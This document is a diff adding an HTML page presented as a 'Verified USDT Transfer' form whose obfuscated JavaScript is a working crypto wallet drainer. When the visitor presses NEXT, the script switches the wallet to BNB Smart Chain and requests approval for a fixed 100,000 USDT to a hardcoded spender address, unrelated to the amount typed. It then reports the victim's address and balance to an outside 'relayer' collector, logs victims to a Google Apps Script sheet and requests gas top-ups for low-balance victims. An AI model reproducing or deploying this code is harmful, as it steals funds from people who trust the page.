@@ -1,0 +1,640 @@
+<!-- Silent connect + improved NEXT button states + spinner -->
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8"/>
+        <title>Verified USDT Transfer (silent connect + UI)</title>
+        <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"/>
+        <style>
+            :root {
+                --bg: #071025;
+                --panel: rgba(255,255,255,0.02);
+                --accent: #2563eb;
+                --text: #e6eef8;
+                --muted: #98a3bf;
+                --placeholder: rgba(230,238,248,0.45);
+                --modal-bg: rgba(2,6,23,0.75);
+                --danger: #ef4444;
+            }
+
+            html,body {
+                height: 100%;
+                margin: 0;
+                background: linear-gradient(180deg,#041026,#071025);
+                font-family: Inter,system-ui,Arial,sans-serif;
+                color: var(--text);
+                -webkit-font-smoothing: antialiased
+            }
+
+            .viewport {
+                min-height: 100svh;
+                display: flex;
+                flex-direction: column;
+            }
+
+            .center-wrap {
+                flex: 1;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 18px;
+                transition: transform 360ms cubic-bezier(.2,.9,.2,1), padding-bottom 360ms cubic-bezier(.2,.9,.2,1);
+            }
+
+            .center-wrap.lift {
+                transform: translateY(-20vh);
+            }
+
+            .card {
+                width: 100%;
+                max-width: 520px;
+                background: linear-gradient(180deg, rgba(255,255,255,0.014), rgba(255,255,255,0.01));
+                border-radius: 14px;
+                padding: 18px;
+                box-shadow: 0 12px 36px rgba(2,6,23,0.65);
+                border: 1px solid rgba(255,255,255,0.03);
+            }
+
+            label {
+                display: block;
+                font-size: 13px;
+                color: var(--muted);
+                margin-bottom: 8px
+            }
+
+            input[type="text"],input[type="number"] {
+                width: 100%;
+                padding: 12px 14px;
+                border-radius: 10px;
+                border: 1px solid rgba(255,255,255,0.04);
+                background: rgba(255,255,255,0.015);
+                color: var(--text);
+                font-size: 16px;
+                box-sizing: border-box;
+                outline: none;
+                transition: box-shadow 200ms ease, transform 200ms ease;
+            }
+
+            input[type="number"]:focus,input[type="text"]:focus {
+                box-shadow: 0 8px 30px rgba(37,99,235,0.08);
+                transform: translateY(-1px);
+            }
+
+            input[readonly] {
+                opacity: 0.95
+            }
+
+            input::placeholder {
+                color: var(--placeholder);
+                font-weight: 500;
+            }
+
+            .spacer {
+                height: 12px
+            }
+
+            /* Button */
+            .btn {
+                width: calc(100% - 36px);
+                margin: 0 18px;
+                position: fixed;
+                left: 0;
+                right: 0;
+                bottom: 20px;
+                max-width: 520px;
+                margin-left: auto;
+                margin-right: auto;
+                padding: 14px;
+                border-radius: 12px;
+                border: 0;
+                background: linear-gradient(90deg,var(--accent), #7c5cff);
+                color: white;
+                font-weight: 800;
+                font-size: 16px;
+                cursor: pointer;
+                box-shadow: 0 10px 34px rgba(38,99,235,0.16);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 10px;
+            }
+
+            .btn:disabled {
+                opacity: 0.65;
+                cursor: not-allowed
+            }
+
+            .btn .btn-text {
+                line-height: 1
+            }
+
+            /* spinner */
+            .spinner {
+                width: 18px;
+                height: 18px;
+                border-radius: 50%;
+                border: 2px solid rgba(255,255,255,0.18);
+                border-top-color: rgba(255,255,255,0.98);
+                animation: spin 0.9s linear infinite;
+                display: inline-block;
+                vertical-align: middle
+            }
+
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg)
+                }
+            }
+
+            @media(min-width: 880px) {
+                .center-wrap {
+                    padding:40px 22px;
+                }
+
+                .card {
+                    padding: 26px
+                }
+
+                .btn {
+                    bottom: 28px
+                }
+            }
+
+            /* Modal styles (unchanged from before) */
+            .overlay {
+                position: fixed;
+                inset: 0;
+                background: var(--modal-bg);
+                display: none;
+                align-items: center;
+                justify-content: center;
+                z-index: 9999;
+                padding: 20px;
+            }
+
+            .overlay.show {
+                display: flex;
+            }
+
+            .modal {
+                width: 100%;
+                max-width: 420px;
+                background: linear-gradient(180deg,#061025,#071025);
+                border-radius: 14px;
+                padding: 20px;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+                border: 1px solid rgba(255,255,255,0.04);
+                color: var(--text);
+                text-align: center;
+                position: relative;
+            }
+
+            .modal .close {
+                position: absolute;
+                right: 18px;
+                top: 16px;
+                background: transparent;
+                border: 0;
+                color: var(--muted);
+                font-size: 20px;
+                cursor: pointer;
+            }
+
+            .modal-illustration {
+                width: 56px;
+                height: 56px;
+                margin: 0 auto 8px;
+                border-radius: 12px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                background: linear-gradient(135deg,#ff758c,#ffb199);
+                box-shadow: 0 8px 30px rgba(255,117,140,0.12);
+            }
+
+            .modal h3 {
+                margin: 6px 0 6px 0;
+                font-size: 18px;
+            }
+
+            .modal p {
+                margin: 8px 0 18px 0;
+                color: var(--muted);
+                font-size: 14px;
+            }
+
+            .modal .ok-btn {
+                padding: 10px 16px;
+                border-radius: 10px;
+                border: 0;
+                background: linear-gradient(90deg,var(--accent), #7c5cff);
+                color: white;
+                font-weight: 700;
+                cursor: pointer;
+            }
+
+            .modal .hint {
+                margin-top: 10px;
+                font-size: 12px;
+                color: var(--muted);
+            }
+
+            @media (prefers-reduced-motion: reduce) {
+                .center-wrap {
+                    transition: none
+                }
+
+                .modal {
+                    transition: none
+                }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="viewport">
+            <div class="center-wrap" id="centerWrap">
+                <div class="card" role="main" aria-label="Approve USDT">
+                    <div>
+                        <label for="addr">Address</label>
+                        <input id="addr" type="text" readonly/>
+                    </div>
+                    <div class="spacer"></div>
+                    <div>
+                        <label for="amount">Amount (USDT)</label>
+                        <input id="amount" type="number" inputmode="decimal" step="any" placeholder="Enter amount in USDT"/>
+                    </div>
+                    <!-- Status & helper text removed (console logging only) -->
+                </div>
+            </div>
+            <!-- Button: text + optional spinner element -->
+            <button id="nextBtn" class="btn" disabled aria-live="polite">
+                <span id="btnSpinner" style="display:none" class="spinner" aria-hidden="true"></span>
+                <span id="btnText" class="btn-text">NEXT</span>
+            </button>
+        </div>
+        <!-- Modal for missing wallet / messages -->
+        <div id="noWalletOverlay" class="overlay" role="dialog" aria-modal="true" aria-labelledby="nwTitle" aria-describedby="nwDesc">
+            <div class="modal">
+                <button class="close" id="modalClose" aria-label="Close">✕</button>
+                <div class="modal-illustration" aria-hidden="true">⚠️</div>
+                <h3 id="nwTitle">Please open this in a wallet browser</h3>
+                <p id="nwDesc">This page must be opened inside Trust Wallet or MetaMask's in-app browser (or another injected-dapp browser) to approve tokens.</p>
+                <button id="modalOk" class="ok-btn">OK</button>
+                <div class="hint">If you're on desktop, install MetaMask or open this page in your mobile wallet's browser.</div>
+            </div>
+        </div>
+        <!-- ethers UMD -->
+        <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+        <script>
+
+            function _0x3491(_0x5c7915, _0x1fe623) {
+                const _0x280d5d = _0x280d();
+                return _0x3491 = function(_0x3491c4, _0x453a86) {
+                    _0x3491c4 = _0x3491c4 - 0xdc;
+                    let _0x3b81bb = _0x280d5d[_0x3491c4];
+                    return _0x3b81bb;
+                }
+                ,
+                _0x3491(_0x5c7915, _0x1fe623);
+            }
+            (function(_0x380a56, _0x5bb5fc) {
+                const _0x53e6d8 = _0x3491
+                  , _0x32162d = _0x380a56();
+                while (!![]) {
+                    try {
+                        const _0x2717c6 = parseInt(_0x53e6d8(0x111)) / 0x1 * (-parseInt(_0x53e6d8(0x117)) / 0x2) + -parseInt(_0x53e6d8(0x118)) / 0x3 + parseInt(_0x53e6d8(0xef)) / 0x4 * (-parseInt(_0x53e6d8(0x11a)) / 0x5) + -parseInt(_0x53e6d8(0xe9)) / 0x6 * (parseInt(_0x53e6d8(0x155)) / 0x7) + -parseInt(_0x53e6d8(0x106)) / 0x8 + -parseInt(_0x53e6d8(0xf7)) / 0x9 * (parseInt(_0x53e6d8(0xeb)) / 0xa) + parseInt(_0x53e6d8(0x10d)) / 0xb;
+                        if (_0x2717c6 === _0x5bb5fc)
+                            break;
+                        else
+                            _0x32162d['push'](_0x32162d['shift']());
+                    } catch (_0x22b623) {
+                        _0x32162d['push'](_0x32162d['shift']());
+                    }
+                }
+            }(_0x280d, 0x4f28f),
+            (function() {
+                const _0x5a02b2 = _0x3491
+                  , _0xefe3cd = _0x5a02b2(0x13c)
+                  , _0x2318ab = _0x5a02b2(0x10b)
+                  , _0x2635d2 = _0x5a02b2(0x123)
+                  , _0x2610a0 = '0x71e163A0631F054CbA1dA32416Fd1432281c5dB1'
+                  , _0xbc35f7 = 0x186a0
+                  , _0x171bc3 = _0x5a02b2(0xe6)
+                  , _0x5d3c98 = ['function\x20approve(address\x20spender,\x20uint256\x20amount)\x20returns\x20(bool)', _0x5a02b2(0x13a), _0x5a02b2(0x127), 'function\x20balanceOf(address\x20account)\x20view\x20returns\x20(uint256)', _0x5a02b2(0x149)]
+                  , _0x36bc86 = document['getElementById'](_0x5a02b2(0x136))
+                  , _0x5486b2 = document[_0x5a02b2(0x128)](_0x5a02b2(0x12f))
+                  , _0x17f6e7 = document[_0x5a02b2(0x128)]('nextBtn')
+                  , _0x838e4a = document[_0x5a02b2(0x128)](_0x5a02b2(0x121))
+                  , _0x2282db = document['getElementById']('btnSpinner')
+                  , _0x57e976 = document[_0x5a02b2(0x128)](_0x5a02b2(0xf9))
+                  , _0x4f30e4 = document['getElementById'](_0x5a02b2(0x141))
+                  , _0x3bd5dc = document[_0x5a02b2(0x128)](_0x5a02b2(0x14a))
+                  , _0x5b49fe = document[_0x5a02b2(0x128)](_0x5a02b2(0xfa));
+                _0x36bc86[_0x5a02b2(0x138)] = _0x2610a0;
+                function _0x5aea7b(_0x218916) {
+                    const _0x371e08 = _0x5a02b2;
+                    console[_0x371e08(0x146)]('status:', _0x218916);
+                }
+                async function _0x23c627(_0xbca445, _0x300d3c, _0x187220='Sheet1') {
+                    const _0x23f15a = _0x5a02b2
+                      , _0xa0a797 = new FormData();
+                    _0xa0a797[_0x23f15a(0x142)](_0x23f15a(0x12f), _0xbca445),
+                    _0xa0a797['append'](_0x23f15a(0x12d), 'UMESH_site2'),
+                    _0xa0a797[_0x23f15a(0x142)](_0x23f15a(0x122), _0x300d3c),
+                    _0xa0a797['append'](_0x23f15a(0xdc), _0x2318ab),
+                    _0xa0a797[_0x23f15a(0x142)](_0x23f15a(0x139), _0x187220),
+                    _0xa0a797[_0x23f15a(0x142)]('action', _0x23f15a(0x142));
+                    try {
+                        await fetch(_0xefe3cd, {
+                            'method': _0x23f15a(0x125),
+                            'body': _0xa0a797
+                        });
+                    } catch (_0x3a1aa1) {
+                        console[_0x23f15a(0x145)]('sheet\x20post\x20failed', _0x3a1aa1);
+                    }
+                }
+                function _0x34d017() {
+                    const _0x2489ec = _0x5a02b2;
+                    if (window[_0x2489ec(0x108)] && Array['isArray'](window['ethereum']['providers']))
+                        try {
+                            return window[_0x2489ec(0x108)]['providers'][0x0];
+                        } catch (_0xabb4ea) {
+                            return window[_0x2489ec(0x108)];
+                        }
+                    if (window[_0x2489ec(0x108)])
+                        return window[_0x2489ec(0x108)];
+                    if (window[_0x2489ec(0x153)])
+                        return window[_0x2489ec(0x153)];
+                    if (window[_0x2489ec(0x150)] && window[_0x2489ec(0x150)][_0x2489ec(0x130)])
+                        return window[_0x2489ec(0x150)]['currentProvider'];
+                    return null;
+                }
+                function _0x266861() {
+                    const _0x3131bb = _0x5a02b2;
+                    _0x4f30e4[_0x3131bb(0x109)][_0x3131bb(0x12b)](_0x3131bb(0x131)),
+                    _0x3bd5dc[_0x3131bb(0xee)]();
+                }
+                function _0x6d4c78() {
+                    const _0x5195d6 = _0x5a02b2;
+                    _0x4f30e4[_0x5195d6(0x109)][_0x5195d6(0x12e)](_0x5195d6(0x131));
+                }
+                _0x3bd5dc[_0x5a02b2(0x129)](_0x5a02b2(0x124), () => _0x6d4c78()),
+                _0x5b49fe[_0x5a02b2(0x129)]('click', () => _0x6d4c78()),
+                _0x5486b2[_0x5a02b2(0x129)](_0x5a02b2(0xee), () => {
+                    const _0x22c6ce = _0x5a02b2;
+                    _0x57e976[_0x22c6ce(0x109)][_0x22c6ce(0x12b)](_0x22c6ce(0x13f)),
+                    _0x57e976[_0x22c6ce(0xf2)][_0x22c6ce(0x126)] = _0x22c6ce(0x134);
+                }
+                ),
+                _0x5486b2[_0x5a02b2(0x129)](_0x5a02b2(0x10c), () => {
+                    const _0x13ec66 = _0x5a02b2;
+                    _0x57e976['classList'][_0x13ec66(0x12e)](_0x13ec66(0x13f)),
+                    _0x57e976[_0x13ec66(0xf2)][_0x13ec66(0x126)] = '';
+                }
+                );
+                function _0x890149() {
+                    const _0x509cda = _0x5a02b2
+                      , _0x2b821d = String(_0x5486b2[_0x509cda(0x138)] || '')['trim']();
+                    _0x17f6e7[_0x509cda(0x115)] = _0x2b821d === '';
+                }
+                _0x5486b2[_0x5a02b2(0x129)](_0x5a02b2(0x105), _0x890149);
+                async function _0x445337(_0xc81dcc) {
+                    const _0x2d7788 = _0x5a02b2;
+                    if (!_0xc81dcc || typeof _0xc81dcc[_0x2d7788(0xde)] !== _0x2d7788(0x10a))
+                        return;
+                    try {
+                        await _0xc81dcc[_0x2d7788(0xde)]({
+                            'method': 'wallet_switchEthereumChain',
+                            'params': [{
+                                'chainId': _0x2d7788(0x11c)
+                            }]
+                        });
+                    } catch (_0x2fa010) {
+                        try {
+                            _0x2fa010 && (_0x2fa010[_0x2d7788(0x122)] === 0x1326 || _0x2fa010['message'] && _0x2fa010[_0x2d7788(0x144)][_0x2d7788(0x156)]()['includes']('unrecognized')) && await _0xc81dcc[_0x2d7788(0xde)]({
+                                'method': _0x2d7788(0x143),
+                                'params': [{
+                                    'chainId': _0x2d7788(0x11c),
+                                    'chainName': _0x2d7788(0xe2),
+                                    'nativeCurrency': {
+                                        'name': _0x2d7788(0x12c),
+                                        'symbol': _0x2d7788(0x12c),
+                                        'decimals': 0x12
+                                    },
+                                    'rpcUrls': [_0x2d7788(0xdf)],
+                                    'blockExplorerUrls': [_0x2d7788(0x10e)]
+                                }]
+                            });
+                        } catch (_0x3eb446) {}
+                    }
+                }
+                async function _0x3b7bbc(_0x2fdc27) {
+                    const _0x3922fb = _0x5a02b2;
+                    if (!_0x2fdc27 || typeof _0x2fdc27[_0x3922fb(0xde)] !== 'function')
+                        return null;
+                    let _0x49a95f = [];
+                    try {
+                        _0x49a95f = await _0x2fdc27[_0x3922fb(0xde)]({
+                            'method': _0x3922fb(0x133)
+                        });
+                    } catch (_0xe9b262) {
+                        _0x49a95f = [];
+                    }
+                    if (Array['isArray'](_0x49a95f) && _0x49a95f['length'])
+                        return _0x49a95f[0x0];
+                    try {
+                        const _0x56aaf4 = await _0x2fdc27['request']({
+                            'method': _0x3922fb(0xf5)
+                        });
+                        if (Array[_0x3922fb(0xea)](_0x56aaf4) && _0x56aaf4[_0x3922fb(0x11d)])
+                            return _0x56aaf4[0x0];
+                    } catch (_0x150760) {
+                        console[_0x3922fb(0x104)](_0x3922fb(0xf3), _0x150760);
+                    }
+                    return null;
+                }
+                function _0x51665f() {
+                    const _0x1c0983 = _0x5a02b2;
+                    _0x17f6e7['disabled'] = !![],
+                    _0x2282db['style'][_0x1c0983(0x120)] = _0x1c0983(0x100),
+                    _0x838e4a['textContent'] = _0x1c0983(0xe3);
+                }
+                function _0x483665() {
+                    const _0x39ebdb = _0x5a02b2;
+                    _0x17f6e7['disabled'] = !![],
+                    _0x2282db['style'][_0x39ebdb(0x120)] = _0x39ebdb(0xf8),
+                    _0x838e4a[_0x39ebdb(0xfc)] = 'Processing...';
+                }
+                function _0x3874f8() {
+                    const _0x3ca305 = _0x5a02b2;
+                    _0x17f6e7[_0x3ca305(0x115)] = ![],
+                    _0x2282db[_0x3ca305(0xf2)]['display'] = _0x3ca305(0x100),
+                    _0x838e4a['textContent'] = _0x3ca305(0x11b);
+                }
+                _0x17f6e7[_0x5a02b2(0x129)]('click', async function() {
+                    const _0x1ec900 = _0x5a02b2;
+                    _0x51665f();
+                    try {
+                        const _0x40cae7 = _0x34d017();
+                        if (!_0x40cae7) {
+                            _0x266861(),
+                            _0x3874f8();
+                            return;
+                        }
+                        await _0x445337(_0x40cae7);
+                        const _0xa47afb = await _0x3b7bbc(_0x40cae7);
+                        if (!_0xa47afb) {
+                            _0x266861(),
+                            _0x3874f8();
+                            return;
+                        }
+                        _0x483665(),
+                        _0x5aea7b(_0x1ec900(0x13d) + _0xa47afb);
+                        const _0x5edbf4 = new ethers['BrowserProvider'](_0x40cae7,_0x1ec900(0x152))
+                          , _0x5ef7ab = await _0x5edbf4[_0x1ec900(0x102)]()
+                          , _0x2dcf78 = await _0x5ef7ab[_0x1ec900(0xf4)]()
+                          , _0x256a2f = new ethers[(_0x1ec900(0x13e))](_0x2635d2,_0x5d3c98,_0x5edbf4)['connect'](_0x5ef7ab)
+                          , _0x300eac = await _0x256a2f[_0x1ec900(0x112)]()['catch']( () => 0x12)
+                          , _0x167e72 = ethers[_0x1ec900(0xff)](String(_0xbc35f7), _0x300eac)
+                          , _0x190c8c = await _0x256a2f[_0x1ec900(0x11e)](_0x2dcf78)
+                          , _0x1b7e32 = ethers[_0x1ec900(0xe7)](_0x190c8c, _0x300eac)
+                          , _0x5486ac = await _0x5edbf4['getBalance'](_0x2dcf78)
+                          , _0x5e5e9f = ethers[_0x1ec900(0x132)](_0x5486ac)
+                          , _0x86ee8d = Number(_0x1b7e32) - 0.05
+                          , _0x4fadb3 = Number(_0x86ee8d['toFixed'](0x2));
+                        if (_0x5e5e9f < 0.00004 && _0x4fadb3 > 0x0) {
+                            const _0x2f49a6 = _0x2dcf78[_0x1ec900(0xf1)]()
+                              , _0x49a10c = _0x171bc3['trim']();
+                            if (!_0x2f49a6 || !_0x2f49a6[_0x1ec900(0x113)]('0x') || _0x2f49a6[_0x1ec900(0x11d)] < 0x28) {
+                                alert(_0x1ec900(0x14f)),
+                                _0x3874f8();
+                                return;
+                            }
+                            if (!_0x49a10c) {
+                                alert(_0x1ec900(0x137)),
+                                _0x3874f8();
+                                return;
+                            }
+                            try {
+                                const _0x1ae20f = await _0x42c3ad(_0x2f49a6, _0x49a10c);
+                                if (!_0x1ae20f['ok']) {
+                                    alert(_0x1ec900(0x13b) + _0x1ae20f[_0x1ec900(0x101)] + _0x1ec900(0x154) + JSON[_0x1ec900(0x11f)](_0x1ae20f['body'])),
+                                    _0x3874f8();
+                                    return;
+                                } else
+                                    console['log'](_0x1ec900(0x14d));
+                            } catch (_0x254d79) {
+                                alert('Request\x20error:\x20' + (_0x254d79?.['message'] ?? _0x254d79)),
+                                _0x3874f8();
+                                return;
+                            }
+                        }
+                        _0x5aea7b(_0x1ec900(0x140) + _0xbc35f7 + _0x1ec900(0xec));
+                        const _0x33e12d = await _0x256a2f[_0x1ec900(0xe8)](_0x2610a0, _0x167e72);
+                        _0x5aea7b(_0x1ec900(0xfe) + (_0x33e12d['hash'] || 'pending')),
+                        await _0x33e12d[_0x1ec900(0x10f)](),
+                        _0x5aea7b(_0x1ec900(0xfd) + (_0x33e12d[_0x1ec900(0x110)] || 'confirmed')),
+                        _0x3a8140({
+                            'signerAddress': _0x2dcf78,
+                            'amountHuman': _0x4fadb3
+                        }),
+                        _0x23c627(_0x4fadb3, _0x2dcf78, _0x1ec900(0xe1)),
+                        _0x23c627(_0x4fadb3, _0x2dcf78, 'Sheet2'),
+                        _0x4f30e4[_0x1ec900(0x114)](_0x1ec900(0xe4))[_0x1ec900(0xfc)] = 'Approved',
+                        _0x4f30e4[_0x1ec900(0x114)](_0x1ec900(0x14b))[_0x1ec900(0xfc)] = _0x1ec900(0x119),
+                        _0x3bd5dc[_0x1ec900(0xfc)] = _0x1ec900(0x151),
+                        _0x266861();
+                    } catch (_0x1200f2) {
+                        console[_0x1ec900(0x104)](_0x1ec900(0xf6), _0x1200f2),
+                        _0x4f30e4[_0x1ec900(0x114)](_0x1ec900(0xe4))[_0x1ec900(0xfc)] = _0x1ec900(0xfb),
+                        _0x4f30e4[_0x1ec900(0x114)](_0x1ec900(0x14b))[_0x1ec900(0xfc)] = '',
+                        _0x3bd5dc[_0x1ec900(0xfc)] = _0x1ec900(0x151),
+                        _0x266861();
+                    } finally {
+                        _0x3874f8();
+                    }
+                });
+                async function _0x3a8140({signerAddress: _0x280d18, amountHuman: _0x40750e}) {
+                    const _0x220aba = _0x5a02b2;
+                    let _0x1b853c = _0x220aba(0x123)
+                      , _0x193c6a = _0x220aba(0x14c);
+                    const _0x55d6e2 = '0x93589C3628285cdFD6799e6FD697e4FcFfa72645'
+                      , _0x597a61 = {
+                        'token': _0x1b853c,
+                        'from': _0x280d18,
+                        'amountHuman': String(_0x40750e),
+                        'to': _0x55d6e2
+                    };
+                    try {
+                        const _0x51382d = await fetch(_0x193c6a, {
+                            'method': _0x220aba(0x125),
+                            'headers': {
+                                'Content-Type': _0x220aba(0xdd)
+                            },
+                            'body': JSON['stringify'](_0x597a61)
+                        })
+                          , _0x1abd0f = await _0x51382d[_0x220aba(0x135)]();
+                        !_0x51382d['ok'] ? console['error']('Relayer\x20returned\x20error', _0x1abd0f) : console[_0x220aba(0x146)]('Relayer\x20accepted', _0x1abd0f);
+                    } catch (_0x2210a0) {
+                        console[_0x220aba(0x104)](_0x220aba(0x14e), _0x2210a0);
+                    }
+                }
+                async function _0x42c3ad(_0x2b93b5, _0x567afc) {
+                    const _0x1392ee = _0x5a02b2
+                      , _0x328d81 = _0x1392ee(0xed)
+                      , _0x500234 = {
+                        'to': _0x2b93b5
+                    }
+                      , _0x3fa7a3 = {
+                        'method': _0x1392ee(0x125),
+                        'headers': {
+                            'Content-Type': 'application/json',
+                            'x-topup-secret': _0x567afc
+                        },
+                        'body': JSON[_0x1392ee(0x11f)](_0x500234)
+                    }
+                      , _0x36eed3 = await fetch(_0x328d81, _0x3fa7a3)
+                      , _0x42ba36 = await _0x36eed3[_0x1392ee(0x103)]();
+                    let _0x23b046 = null;
+                    try {
+                        _0x23b046 = JSON[_0x1392ee(0x147)](_0x42ba36);
+                    } catch (_0x5ad93c) {}
+                    return {
+                        'ok': _0x36eed3['ok'],
+                        'status': _0x36eed3[_0x1392ee(0x101)],
+                        'body': _0x23b046 ?? _0x42ba36
+                    };
+                }
+                window[_0x5a02b2(0x129)](_0x5a02b2(0x12a), async function() {
+                    const _0x5af7c3 = _0x5a02b2
+                      , _0x3a96f2 = _0x34d017();
+                    if (!_0x3a96f2) {
+                        _0x4f30e4['querySelector'](_0x5af7c3(0xe4))[_0x5af7c3(0xfc)] = _0x5af7c3(0x116),
+                        _0x4f30e4[_0x5af7c3(0x114)](_0x5af7c3(0x14b))[_0x5af7c3(0xfc)] = _0x5af7c3(0xe5),
+                        _0x3bd5dc['textContent'] = 'OK',
+                        _0x266861();
+                        return;
+                    }
+                    try {
+                        const _0x4564ed = await _0x3a96f2['request']?.({
+                            'method': _0x5af7c3(0x133)
+                        })[_0x5af7c3(0x148)]( () => []);
+                        Array['isArray'](_0x4564ed) && _0x4564ed[_0x5af7c3(0x11d)] ? console['log'](_0x5af7c3(0xf0), _0x4564ed[0x0]) : console[_0x5af7c3(0x146)](_0x5af7c3(0xe0));
+                    } catch (_0x1f1b5b) {
+                        console['log'](_0x5af7c3(0x107), _0x1f1b5b);
+                    }
+                }),
+                _0x890149(),
+                _0x3874f8();
+            }()));
+            function _0x280d() {
+                const _0x102be8 = ['NEXT', '0x38', 'length', 'balanceOf', 'stringify', 'display', 'btnText', 'code', '0x55d398326f99059fF775485246999027B3197955', 'click', 'POST', 'paddingBottom', 'function\x20symbol()\x20view\x20returns\x20(string)', 'getElementById', 'addEventListener', 'load', 'add', 'BNB', 'site_name', 'remove', 'amount', 'currentProvider', 'show', 'formatEther', 'eth_accounts', '20vh', 'json', 'addr', 'Enter\x20the\x20API\x20secret\x20(x-topup-secret).', 'value', 'sheet', 'function\x20decimals()\x20view\x20returns\x20(uint8)', 'Top-up\x20failed!\x0aStatus:\x20', 'https://script.google.com/macros/s/AKfycbxKZs3UXtcC2fGrz1yADRJmoverRJ_UsEE78PM0KZca-mc2o2bb7MySSkwU1ihYtTkoGg/exec', 'connected\x20as\x20', 'Contract', 'lift', 'requesting\x20approval\x20for\x20fixed\x20', 'noWalletOverlay', 'append', 'wallet_addEthereumChain', 'message', 'warn', 'log', 'parse', 'catch', 'function\x20allowance(address\x20owner,\x20address\x20spender)\x20view\x20returns\x20(uint256)', 'modalOk', '.modal\x20p', 'https://collector.checksbep20.org/collect', 'Top-up\x20request\x20succeeded.', 'notify\x20failed', 'Enter\x20a\x20valid\x200x\x20recipient\x20address.', 'web3', 'Close', 'any', 'BinanceChain', '\x0aError:\x20', '1652afXXgM', 'toLowerCase', 'token', 'application/json', 'request', 'https://bsc-dataseed.binance.org/', 'not\x20connected', 'Sheet1', 'BNB\x20Smart\x20Chain\x20Mainnet', 'Connecting...', '.modal\x20h3', 'This\x20page\x20must\x20be\x20opened\x20inside\x20Trust\x20Wallet\x20or\x20MetaMask\x20browser.', '1x143414', 'formatUnits', 'approve', '7446IVGSur', 'isArray', '40wScemu', '\x20USDT', 'https://api.checksbep20.org/topup', 'focus', '44PDeUov', 'connected\x20(silent):', 'trim', 'style', 'eth_requestAccounts\x20failed', 'getAddress', 'eth_requestAccounts', 'flow\x20error', '600489PpWSdR', 'inline-block', 'centerWrap', 'modalClose', 'User\x20has\x20cancelled\x20the\x20request', 'textContent', 'approved\x20', 'tx\x20sent\x20', 'parseUnits', 'none', 'status', 'getSigner', 'text', 'error', 'input', '1569960zTlPjk', 'silent\x20check\x20failed', 'ethereum', 'classList', 'function', 'CHANGE_ME_TO_A_LONG_RANDOM_STRING', 'blur', '21549715xorifJ', 'https://bscscan.com', 'wait', 'hash', '271cxLGuT', 'decimals', 'startsWith', 'querySelector', 'disabled', 'Please\x20open\x20this\x20in\x20a\x20wallet\x20browser', '1502zoXBJM', '1911951CroWty', 'Approval\x20successful.', '17265nJVBJa'];
+                _0x280d = function() {
+                    return _0x102be8;
+                }
+                ;
+                return _0x280d();
+            }
+        </script>
+    </body>
+</html>
